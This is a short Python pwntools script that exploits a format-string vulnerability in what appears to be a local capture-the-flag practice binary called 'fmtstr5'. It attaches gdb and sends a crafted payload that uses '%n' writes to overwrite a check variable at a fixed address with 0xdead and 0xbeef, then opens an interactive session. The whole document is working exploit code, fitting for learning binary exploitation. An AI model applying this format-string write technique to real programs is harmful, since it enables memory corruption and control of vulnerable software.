#!/bin/python
from pwn import *
exe = ELF('./fmtstr5')

p = process(exe.path)
context.terminal = ['alacritty', '-e']
gdb.attach(p, gdbscript='''
b*main+112
           c
           ''')
check_address = 0x404090


payload =F'%{0xbeef}c%10$n'.encode() 
payload += F'%{0xdead - 0xbeef}c%11$n'.encode()
payload = payload.ljust(0x20, b'\x00')
payload += p64(check_address) 
payload += p64(check_address+2)
p.sendlineafter(b'string: ',payload)
p.interactive()
